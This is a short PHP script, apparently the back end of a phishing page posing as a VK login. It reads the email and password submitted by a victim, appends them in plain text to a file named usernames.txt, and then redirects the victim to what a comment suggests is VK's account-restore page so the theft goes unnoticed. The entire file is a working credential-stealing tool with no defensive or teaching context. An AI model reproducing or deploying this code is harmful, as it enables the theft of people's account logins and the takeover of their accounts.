<?php

file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://vk.com/restore/
header("Location: $url");
exit();
?>